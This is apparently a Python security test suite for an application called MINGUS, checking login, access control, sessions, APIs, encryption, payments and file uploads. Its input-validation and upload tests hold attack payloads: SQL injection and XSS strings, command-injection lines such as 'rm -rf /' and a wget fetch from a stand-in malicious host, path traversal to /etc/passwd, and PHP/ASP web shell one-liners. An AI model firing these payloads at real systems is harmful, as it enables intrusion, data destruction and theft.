"""
Focused Security Test Categories for MINGUS
Specialized security tests for specific security domains
"""

import os
import sys
import json
import time
import hashlib
import requests
import subprocess
import ssl
import socket
import re
import mimetypes
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
import unittest
from loguru import logger
import asyncio
import aiohttp
import sqlite3
import psutil
import yaml
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

class TestCategory(Enum):
    """Focused test categories"""
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INPUT_VALIDATION = "input_validation"
    SESSION_MANAGEMENT = "session_management"
    API_SECURITY = "api_security"
    DATA_ENCRYPTION = "data_encryption"
    PAYMENT_PROCESSING = "payment_processing"
    FILE_UPLOAD = "file_upload"

class TestSeverity(Enum):
    """Test severity levels"""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

@dataclass
class SecurityTest:
    """Security test structure"""
    test_id: str
    name: str
    category: TestCategory
    severity: TestSeverity
    description: str
    test_function: Callable
    expected_result: Any
    timeout: int = 30
    dependencies: List[str] = field(default_factory=list)

class AuthenticationSecurityTests:
    """Authentication security test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_password_strength_requirements(self) -> bool:
        """Test password strength requirements"""
        weak_passwords = [
            "123456", "password", "admin", "qwerty", "letmein",
            "welcome", "monkey", "dragon", "master", "hello"
        ]
        
        strong_passwords = [
            "Str0ngP@ssw0rd!", "C0mpl3x!P@ss2024", "S3cur3!P@ssw0rd#",
            "MyP@ssw0rd!2024", "S3cur1ty!P@ss"
        ]
        
        # Test weak passwords should be rejected
        for password in weak_passwords:
            if self._is_password_accepted(password):
                logger.error(f"Weak password accepted: {password}")
                return False
        
        # Test strong passwords should be accepted
        for password in strong_passwords:
            if not self._is_password_accepted(password):
                logger.error(f"Strong password rejected: {password}")
                return False
        
        return True
    
    def test_login_rate_limiting(self) -> bool:
        """Test login rate limiting"""
        max_attempts = 5
        lockout_duration = 300  # 5 minutes
        
        # Attempt multiple failed logins
        for i in range(max_attempts + 2):
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": "test_user", "password": "wrong_password"},
                timeout=10
            )
            
            if i < max_attempts and response.status_code == 429:  # Too Many Requests
                logger.info(f"Rate limiting triggered after {i + 1} attempts")
                return True
            
            if i >= max_attempts and response.status_code != 429:
                logger.error("Rate limiting not enforced")
                return False
        
        return True
    
    def test_account_lockout_mechanism(self) -> bool:
        """Test account lockout mechanism"""
        # Attempt to lock out account
        for i in range(10):
            response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": "test_user", "password": "wrong_password"},
                timeout=10
            )
        
        # Try to login with correct password
        response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": "test_user", "password": "correct_password"},
            timeout=10
        )
        
        # Should be locked out
        return response.status_code == 423  # Locked
    
    def test_multi_factor_authentication(self) -> bool:
        """Test multi-factor authentication"""
        # Check if MFA endpoints exist
        mfa_endpoints = [
            "/api/auth/mfa/setup",
            "/api/auth/mfa/verify",
            "/api/auth/mfa/disable"
        ]
        
        for endpoint in mfa_endpoints:
            response = self.session.get(f"{self.base_url}{endpoint}")
            if response.status_code == 404:
                logger.error(f"MFA endpoint not found: {endpoint}")
                return False
        
        # Test MFA setup flow
        setup_response = self.session.post(
            f"{self.base_url}/api/auth/mfa/setup",
            json={"user_id": "test_user"}
        )
        
        if setup_response.status_code != 200:
            logger.error("MFA setup failed")
            return False
        
        return True
    
    def test_password_reset_security(self) -> bool:
        """Test password reset security"""
        # Test password reset request
        reset_response = self.session.post(
            f"{self.base_url}/api/auth/password-reset",
            json={"email": "test@example.com"}
        )
        
        if reset_response.status_code != 200:
            logger.error("Password reset request failed")
            return False
        
        # Check if reset token is secure
        if "reset_token" in reset_response.text:
            # Token should not be exposed in response
            logger.error("Reset token exposed in response")
            return False
        
        return True
    
    def _is_password_accepted(self, password: str) -> bool:
        """Check if password meets strength requirements"""
        if len(password) < 12:
            return False
        
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password)
        
        return has_upper and has_lower and has_digit and has_special

class AuthorizationAccessControlTests:
    """Authorization and access control test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_role_based_access_control(self) -> bool:
        """Test role-based access control"""
        roles = ["user", "admin", "moderator", "guest"]
        protected_endpoints = [
            "/api/admin/users",
            "/api/admin/settings",
            "/api/admin/logs",
            "/api/user/profile",
            "/api/user/settings"
        ]
        
        for role in roles:
            # Login with role
            login_response = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": f"{role}_user", "password": "password"}
            )
            
            if login_response.status_code != 200:
                continue
            
            # Test access to endpoints
            for endpoint in protected_endpoints:
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                if "admin" in endpoint and role != "admin":
                    if response.status_code != 403:
                        logger.error(f"Unauthorized access to {endpoint} with role {role}")
                        return False
                elif role == "admin":
                    if response.status_code == 403:
                        logger.error(f"Admin denied access to {endpoint}")
                        return False
        
        return True
    
    def test_api_endpoint_authorization(self) -> bool:
        """Test API endpoint authorization"""
        endpoints = [
            ("GET", "/api/users", ["admin"]),
            ("POST", "/api/users", ["admin"]),
            ("PUT", "/api/users/1", ["admin", "user"]),
            ("DELETE", "/api/users/1", ["admin"]),
            ("GET", "/api/settings", ["admin"]),
            ("PUT", "/api/settings", ["admin"])
        ]
        
        for method, endpoint, allowed_roles in endpoints:
            # Test without authentication
            if method == "GET":
                response = self.session.get(f"{self.base_url}{endpoint}")
            elif method == "POST":
                response = self.session.post(f"{self.base_url}{endpoint}")
            elif method == "PUT":
                response = self.session.put(f"{self.base_url}{endpoint}")
            elif method == "DELETE":
                response = self.session.delete(f"{self.base_url}{endpoint}")
            
            if response.status_code != 401:
                logger.error(f"Unauthenticated access allowed to {method} {endpoint}")
                return False
        
        return True
    
    def test_resource_access_control(self) -> bool:
        """Test resource access control"""
        # Test file access controls
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/var/log/auth.log",
            "/var/lib/mingus/config/database.conf"
        ]
        
        for file_path in sensitive_files:
            if os.path.exists(file_path):
                # Check file permissions
                stat = os.stat(file_path)
                mode = stat.st_mode & 0o777
                
                if mode == 0o777:  # Too permissive
                    logger.error(f"File {file_path} has overly permissive permissions")
                    return False
                
                if mode & 0o002:  # World writable
                    logger.error(f"File {file_path} is world writable")
                    return False
        
        return True
    
    def test_privilege_escalation_prevention(self) -> bool:
        """Test privilege escalation prevention"""
        # Test user trying to access admin functions
        user_response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": "regular_user", "password": "password"}
        )
        
        if user_response.status_code == 200:
            # Try to access admin endpoints
            admin_endpoints = [
                "/api/admin/users",
                "/api/admin/settings",
                "/api/admin/logs"
            ]
            
            for endpoint in admin_endpoints:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code != 403:
                    logger.error(f"Privilege escalation possible: {endpoint}")
                    return False
        
        return True

class InputValidationSanitizationTests:
    """Input validation and sanitization test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_sql_injection_prevention(self) -> bool:
        """Test SQL injection prevention"""
        sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "' OR 1=1 --",
            "admin'--",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        endpoints = [
            "/api/search",
            "/api/users",
            "/api/login"
        ]
        
        for endpoint in endpoints:
            for payload in sql_injection_payloads:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"query": payload, "username": payload, "email": payload}
                )
                
                # Check for SQL error messages
                sql_errors = [
                    "sql syntax", "mysql", "oracle", "postgresql",
                    "sqlite", "database error", "sql error"
                ]
                
                response_text = response.text.lower()
                for error in sql_errors:
                    if error in response_text:
                        logger.error(f"SQL injection possible in {endpoint}")
                        return False
        
        return True
    
    def test_xss_prevention(self) -> bool:
        """Test XSS prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert(document.cookie)",
            "<iframe src=javascript:alert('XSS')>"
        ]
        
        endpoints = [
            "/api/comment",
            "/api/profile",
            "/api/message"
        ]
        
        for endpoint in endpoints:
            for payload in xss_payloads:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"content": payload, "message": payload}
                )
                
                # Check if payload is reflected without encoding
                if payload in response.text:
                    logger.error(f"XSS possible in {endpoint}")
                    return False
        
        return True
    
    def test_command_injection_prevention(self) -> bool:
        """Test command injection prevention"""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; whoami",
            "| wget http://malicious.com/script.sh"
        ]
        
        endpoints = [
            "/api/system/command",
            "/api/backup",
            "/api/restore"
        ]
        
        for endpoint in endpoints:
            for payload in command_injection_payloads:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"command": payload, "filename": payload}
                )
                
                # Check for command execution indicators
                if "root:" in response.text or "bin:" in response.text:
                    logger.error(f"Command injection possible in {endpoint}")
                    return False
        
        return True
    
    def test_input_length_validation(self) -> bool:
        """Test input length validation"""
        # Test extremely long inputs
        long_inputs = [
            "a" * 10000,  # Very long string
            "x" * 50000,  # Extremely long string
            "test" * 1000  # Repeated string
        ]
        
        endpoints = [
            "/api/user/profile",
            "/api/comment",
            "/api/message"
        ]
        
        for endpoint in endpoints:
            for long_input in long_inputs:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"name": long_input, "content": long_input}
                )
                
                # Should handle long inputs gracefully
                if response.status_code == 500:
                    logger.error(f"Long input causes server error in {endpoint}")
                    return False
        
        return True
    
    def test_file_path_traversal_prevention(self) -> bool:
        """Test file path traversal prevention"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        endpoints = [
            "/api/file/upload",
            "/api/file/download",
            "/api/backup/download"
        ]
        
        for endpoint in endpoints:
            for payload in path_traversal_payloads:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json={"filename": payload, "path": payload}
                )
                
                # Check for sensitive file content
                if "root:" in response.text or "bin:" in response.text:
                    logger.error(f"Path traversal possible in {endpoint}")
                    return False
        
        return True

class SessionManagementSecurityTests:
    """Session management security test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_session_timeout(self) -> bool:
        """Test session timeout"""
        # Login and get session
        login_response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": "test_user", "password": "password"}
        )
        
        if login_response.status_code != 200:
            return False
        
        # Wait for session timeout (if configured)
        time.sleep(2)  # Adjust based on session timeout
        
        # Try to access protected resource
        protected_response = self.session.get(f"{self.base_url}/api/protected")
        
        # Should be redirected to login or return 401
        return protected_response.status_code in [401, 302]
    
    def test_session_fixation_prevention(self) -> bool:
        """Test session fixation prevention"""
        # Get initial session
        initial_response = self.session.get(f"{self.base_url}/api/auth/login")
        initial_session_id = self.session.cookies.get("session_id")
        
        # Login
        login_response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": "test_user", "password": "password"}
        )
        
        # Check if session ID changed
        new_session_id = self.session.cookies.get("session_id")
        
        if initial_session_id == new_session_id:
            logger.error("Session fixation vulnerability detected")
            return False
        
        return True
    
    def test_session_regeneration(self) -> bool:
        """Test session regeneration"""
        # Login
        login_response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": "test_user", "password": "password"}
        )
        
        if login_response.status_code != 200:
            return False
        
        # Perform sensitive action
        sensitive_response = self.session.post(
            f"{self.base_url}/api/auth/change-password",
            json={"new_password": "newpassword"}
        )
        
        # Check if session was regenerated
        new_session_id = self.session.cookies.get("session_id")
        
        # Session should be regenerated after sensitive action
        return new_session_id is not None
    
    def test_concurrent_session_control(self) -> bool:
        """Test concurrent session control"""
        # Create multiple sessions
        sessions = []
        for i in range(5):
            session = requests.Session()
            login_response = session.post(
                f"{self.base_url}/api/auth/login",
                json={"username": "test_user", "password": "password"}
            )
            if login_response.status_code == 200:
                sessions.append(session)
        
        # Check if only one session is allowed
        if len(sessions) > 1:
            # Test if old sessions are invalidated
            for old_session in sessions[1:]:
                response = old_session.get(f"{self.base_url}/api/protected")
                if response.status_code == 200:
                    logger.error("Multiple concurrent sessions allowed")
                    return False
        
        return True
    
    def test_session_logout(self) -> bool:
        """Test session logout"""
        # Login
        login_response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": "test_user", "password": "password"}
        )
        
        if login_response.status_code != 200:
            return False
        
        # Logout
        logout_response = self.session.post(f"{self.base_url}/api/auth/logout")
        
        if logout_response.status_code != 200:
            return False
        
        # Try to access protected resource
        protected_response = self.session.get(f"{self.base_url}/api/protected")
        
        # Should be denied
        return protected_response.status_code in [401, 302]

class APISecurityTests:
    """API security test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_api_rate_limiting(self) -> bool:
        """Test API rate limiting"""
        endpoints = [
            "/api/users",
            "/api/search",
            "/api/data"
        ]
        
        for endpoint in endpoints:
            # Make multiple requests
            for i in range(20):
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                if i < 10 and response.status_code == 429:  # Rate limited
                    logger.info(f"Rate limiting triggered for {endpoint}")
                    return True
        
        return False
    
    def test_api_authentication(self) -> bool:
        """Test API authentication"""
        protected_endpoints = [
            "/api/admin/users",
            "/api/user/profile",
            "/api/settings"
        ]
        
        for endpoint in protected_endpoints:
            # Test without authentication
            response = self.session.get(f"{self.base_url}{endpoint}")
            
            if response.status_code != 401:
                logger.error(f"API endpoint {endpoint} accessible without authentication")
                return False
        
        return True
    
    def test_api_authorization(self) -> bool:
        """Test API authorization"""
        # Login as regular user
        login_response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": "user", "password": "password"}
        )
        
        if login_response.status_code != 200:
            return False
        
        # Try to access admin endpoints
        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/settings",
            "/api/admin/logs"
        ]
        
        for endpoint in admin_endpoints:
            response = self.session.get(f"{self.base_url}{endpoint}")
            
            if response.status_code != 403:
                logger.error(f"Unauthorized access to {endpoint}")
                return False
        
        return True
    
    def test_api_input_validation(self) -> bool:
        """Test API input validation"""
        invalid_inputs = [
            {"id": "invalid_id"},
            {"email": "invalid_email"},
            {"age": "not_a_number"},
            {"date": "invalid_date"}
        ]
        
        endpoints = [
            "/api/users",
            "/api/profile",
            "/api/settings"
        ]
        
        for endpoint in endpoints:
            for invalid_input in invalid_inputs:
                response = self.session.post(
                    f"{self.base_url}{endpoint}",
                    json=invalid_input
                )
                
                # Should return validation error
                if response.status_code == 200:
                    logger.error(f"Invalid input accepted in {endpoint}")
                    return False
        
        return True
    
    def test_api_error_handling(self) -> bool:
        """Test API error handling"""
        # Test with invalid data
        response = self.session.post(
            f"{self.base_url}/api/users",
            json={"invalid": "data"}
        )
        
        # Should not expose internal errors
        error_indicators = [
            "stack trace", "exception", "error in", "debug",
            "database error", "sql error", "internal server error"
        ]
        
        response_text = response.text.lower()
        for indicator in error_indicators:
            if indicator in response_text:
                logger.error("Internal error information exposed")
                return False
        
        return True

class DataEncryptionProtectionTests:
    """Data encryption and protection test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_data_encryption_at_rest(self) -> bool:
        """Test data encryption at rest"""
        sensitive_files = [
            "/var/lib/mingus/database/encrypted_data.db",
            "/var/lib/mingus/backups/backup_encryption.key",
            "/var/lib/mingus/config/secrets.conf"
        ]
        
        for file_path in sensitive_files:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    content = f.read(100)
                    
                    # Check if content is encrypted
                    if not self._is_encrypted_content(content):
                        logger.error(f"File {file_path} is not encrypted")
                        return False
        
        return True
    
    def test_data_encryption_in_transit(self) -> bool:
        """Test data encryption in transit"""
        if not self.base_url.startswith("https://"):
            logger.error("HTTPS not enabled")
            return False
        
        # Test SSL/TLS configuration
        try:
            hostname = self.base_url.replace("https://", "").split(":")[0]
            context = ssl.create_default_context()
            
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    if not cert:
                        logger.error("No SSL certificate found")
                        return False
                    
                    # Check for strong cipher suites
                    cipher = ssock.cipher()
                    weak_ciphers = ['RC4', 'DES', '3DES', 'MD5']
                    
                    if any(weak in cipher[0] for weak in weak_ciphers):
                        logger.error("Weak cipher suite detected")
                        return False
            
            return True
        except Exception as e:
            logger.error(f"SSL/TLS test failed: {e}")
            return False
    
    def test_key_management(self) -> bool:
        """Test encryption key management"""
        key_files = [
            "/var/lib/mingus/backups/backup_encryption.key",
            "/var/lib/mingus/ssl/private.key"
        ]
        
        for key_file in key_files:
            if os.path.exists(key_file):
                # Check file permissions
                stat = os.stat(key_file)
                mode = stat.st_mode & 0o777
                
                if mode != 0o600:
                    logger.error(f"Key file {key_file} has incorrect permissions")
                    return False
        
        return True
    
    def test_data_anonymization(self) -> bool:
        """Test data anonymization"""
        # Test if sensitive data is properly anonymized
        response = self.session.get(f"{self.base_url}/api/users")
        
        if response.status_code == 200:
            data = response.json()
            for user in data:
                # Check for sensitive fields
                sensitive_fields = ["password", "ssn", "credit_card", "phone"]
                for field in sensitive_fields:
                    if field in user:
                        logger.error(f"Sensitive field {field} not anonymized")
                        return False
        
        return True
    
    def _is_encrypted_content(self, content: bytes) -> bool:
        """Check if content appears to be encrypted"""
        if len(content) < 10:
            return False
        
        # Calculate entropy
        byte_counts = [0] * 256
        for byte in content:
            byte_counts[byte] += 1
        
        entropy = 0
        for count in byte_counts:
            if count > 0:
                p = count / len(content)
                entropy -= p * (p.bit_length() - 1)
        
        # High entropy suggests encryption
        return entropy > 7.0

class PaymentProcessingSecurityTests:
    """Payment processing security test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_payment_data_encryption(self) -> bool:
        """Test payment data encryption"""
        # Test payment endpoint
        payment_data = {
            "card_number": "4111111111111111",
            "expiry_date": "12/25",
            "cvv": "123",
            "amount": 100.00
        }
        
        response = self.session.post(
            f"{self.base_url}/api/payment/process",
            json=payment_data
        )
        
        # Check if sensitive data is encrypted in logs
        log_file = "/var/log/mingus/payment.log"
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                log_content = f.read()
                
                # Check for unencrypted card data
                if "4111111111111111" in log_content:
                    logger.error("Payment data not encrypted in logs")
                    return False
        
        return True
    
    def test_pci_compliance(self) -> bool:
        """Test PCI compliance measures"""
        # Check for PCI compliance endpoints
        pci_endpoints = [
            "/api/payment/pci/status",
            "/api/payment/pci/compliance"
        ]
        
        for endpoint in pci_endpoints:
            response = self.session.get(f"{self.base_url}{endpoint}")
            if response.status_code == 404:
                logger.error(f"PCI compliance endpoint not found: {endpoint}")
                return False
        
        return True
    
    def test_payment_validation(self) -> bool:
        """Test payment validation"""
        invalid_payments = [
            {"card_number": "1234567890123456", "expiry_date": "12/25", "cvv": "123"},
            {"card_number": "4111111111111111", "expiry_date": "12/20", "cvv": "123"},
            {"card_number": "4111111111111111", "expiry_date": "12/25", "cvv": "12"}
        ]
        
        for payment in invalid_payments:
            response = self.session.post(
                f"{self.base_url}/api/payment/validate",
                json=payment
            )
            
            if response.status_code == 200:
                logger.error("Invalid payment data accepted")
                return False
        
        return True
    
    def test_payment_audit_trail(self) -> bool:
        """Test payment audit trail"""
        # Make a test payment
        payment_data = {
            "card_number": "4111111111111111",
            "expiry_date": "12/25",
            "cvv": "123",
            "amount": 100.00
        }
        
        response = self.session.post(
            f"{self.base_url}/api/payment/process",
            json=payment_data
        )
        
        # Check audit trail
        audit_response = self.session.get(f"{self.base_url}/api/payment/audit")
        
        if audit_response.status_code == 200:
            audit_data = audit_response.json()
            if not audit_data:
                logger.error("Payment audit trail not maintained")
                return False
        
        return True

class FileUploadSecurityTests:
    """File upload security test suite"""
    
    def __init__(self, base_url: str, session: requests.Session):
        self.base_url = base_url
        self.session = session
    
    def test_file_type_validation(self) -> bool:
        """Test file type validation"""
        malicious_files = [
            ("malicious.php", b"<?php system($_GET['cmd']); ?>", "text/plain"),
            ("malicious.jsp", b"<%@ page import=\"java.io.*\" %>", "text/plain"),
            ("malicious.asp", b"<% Response.Write(Request.QueryString(\"cmd\")) %>", "text/plain")
        ]
        
        for filename, content, content_type in malicious_files:
            files = {"file": (filename, content, content_type)}
            
            response = self.session.post(
                f"{self.base_url}/api/upload",
                files=files
            )
            
            if response.status_code == 200:
                logger.error(f"Malicious file type accepted: {filename}")
                return False
        
        return True
    
    def test_file_size_limits(self) -> bool:
        """Test file size limits"""
        # Create large file
        large_content = b"x" * (10 * 1024 * 1024)  # 10MB
        
        files = {"file": ("large.txt", large_content, "text/plain")}
        
        response = self.session.post(
            f"{self.base_url}/api/upload",
            files=files
        )
        
        if response.status_code == 200:
            logger.error("File size limit not enforced")
            return False
        
        return True
    
    def test_file_content_validation(self) -> bool:
        """Test file content validation"""
        # Test files with malicious content
        malicious_content = [
            (b"<script>alert('XSS')</script>", "test.html"),
            (b"<?php system($_GET['cmd']); ?>", "test.php"),
            (b"<%@ page import=\"java.io.*\" %>", "test.jsp")
        ]
        
        for content, filename in malicious_content:
            files = {"file": (filename, content, "text/plain")}
            
            response = self.session.post(
                f"{self.base_url}/api/upload",
                files=files
            )
            
            if response.status_code == 200:
                logger.error(f"Malicious content accepted: {filename}")
                return False
        
        return True
    
    def test_file_storage_security(self) -> bool:
        """Test file storage security"""
        # Upload a test file
        test_content = b"This is a test file"
        files = {"file": ("test.txt", test_content, "text/plain")}
        
        response = self.session.post(
            f"{self.base_url}/api/upload",
            files=files
        )
        
        if response.status_code == 200:
            data = response.json()
            file_path = data.get("file_path")
            
            if file_path:
                # Check file permissions
                if os.path.exists(file_path):
                    stat = os.stat(file_path)
                    mode = stat.st_mode & 0o777
                    
                    if mode == 0o777:
                        logger.error("Uploaded file has overly permissive permissions")
                        return False
        
        return True
    
    def test_path_traversal_prevention(self) -> bool:
        """Test path traversal prevention in file uploads"""
        path_traversal_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd"
        ]
        
        test_content = b"test content"
        
        for filename in path_traversal_filenames:
            files = {"file": (filename, test_content, "text/plain")}
            
            response = self.session.post(
                f"{self.base_url}/api/upload",
                files=files
            )
            
            if response.status_code == 200:
                logger.error(f"Path traversal possible with filename: {filename}")
                return False
        
        return True

# Test runner
def run_security_test_categories(base_url: str = "http://localhost:5000") -> Dict[str, Any]:
    """Run all security test categories"""
    session = requests.Session()
    
    test_results = {
        "timestamp": datetime.utcnow().isoformat(),
        "base_url": base_url,
        "categories": {}
    }
    
    # Authentication tests
    auth_tests = AuthenticationSecurityTests(base_url, session)
    test_results["categories"]["authentication"] = {
        "password_strength": auth_tests.test_password_strength_requirements(),
        "rate_limiting": auth_tests.test_login_rate_limiting(),
        "account_lockout": auth_tests.test_account_lockout_mechanism(),
        "mfa": auth_tests.test_multi_factor_authentication(),
        "password_reset": auth_tests.test_password_reset_security()
    }
    
    # Authorization tests
    authz_tests = AuthorizationAccessControlTests(base_url, session)
    test_results["categories"]["authorization"] = {
        "rbac": authz_tests.test_role_based_access_control(),
        "api_auth": authz_tests.test_api_endpoint_authorization(),
        "resource_access": authz_tests.test_resource_access_control(),
        "privilege_escalation": authz_tests.test_privilege_escalation_prevention()
    }
    
    # Input validation tests
    input_tests = InputValidationSanitizationTests(base_url, session)
    test_results["categories"]["input_validation"] = {
        "sql_injection": input_tests.test_sql_injection_prevention(),
        "xss": input_tests.test_xss_prevention(),
        "command_injection": input_tests.test_command_injection_prevention(),
        "length_validation": input_tests.test_input_length_validation(),
        "path_traversal": input_tests.test_file_path_traversal_prevention()
    }
    
    # Session management tests
    session_tests = SessionManagementSecurityTests(base_url, session)
    test_results["categories"]["session_management"] = {
        "timeout": session_tests.test_session_timeout(),
        "fixation": session_tests.test_session_fixation_prevention(),
        "regeneration": session_tests.test_session_regeneration(),
        "concurrent": session_tests.test_concurrent_session_control(),
        "logout": session_tests.test_session_logout()
    }
    
    # API security tests
    api_tests = APISecurityTests(base_url, session)
    test_results["categories"]["api_security"] = {
        "rate_limiting": api_tests.test_api_rate_limiting(),
        "authentication": api_tests.test_api_authentication(),
        "authorization": api_tests.test_api_authorization(),
        "input_validation": api_tests.test_api_input_validation(),
        "error_handling": api_tests.test_api_error_handling()
    }
    
    # Data encryption tests
    encryption_tests = DataEncryptionProtectionTests(base_url, session)
    test_results["categories"]["data_encryption"] = {
        "encryption_at_rest": encryption_tests.test_data_encryption_at_rest(),
        "encryption_in_transit": encryption_tests.test_data_encryption_in_transit(),
        "key_management": encryption_tests.test_key_management(),
        "anonymization": encryption_tests.test_data_anonymization()
    }
    
    # Payment processing tests
    payment_tests = PaymentProcessingSecurityTests(base_url, session)
    test_results["categories"]["payment_processing"] = {
        "data_encryption": payment_tests.test_payment_data_encryption(),
        "pci_compliance": payment_tests.test_pci_compliance(),
        "validation": payment_tests.test_payment_validation(),
        "audit_trail": payment_tests.test_payment_audit_trail()
    }
    
    # File upload tests
    upload_tests = FileUploadSecurityTests(base_url, session)
    test_results["categories"]["file_upload"] = {
        "file_type_validation": upload_tests.test_file_type_validation(),
        "file_size_limits": upload_tests.test_file_size_limits(),
        "content_validation": upload_tests.test_file_content_validation(),
        "storage_security": upload_tests.test_file_storage_security(),
        "path_traversal": upload_tests.test_path_traversal_prevention()
    }
    
    return test_results

if __name__ == "__main__":
    # Run security test categories
    results = run_security_test_categories()
    print(json.dumps(results, indent=2)) 